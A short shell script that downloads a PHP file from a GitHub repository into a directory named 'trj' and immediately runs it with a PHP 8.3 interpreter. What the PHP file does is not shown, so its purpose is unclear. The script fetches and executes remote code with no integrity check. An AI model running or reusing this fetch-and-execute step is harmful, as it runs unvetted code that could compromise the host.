#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o fxwa.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/fxwa.php?t=$(date +%s)" && mv fxwa.php.new fxwa.php
/opt/alt/php83/usr/bin/php fxwa.php "$1"
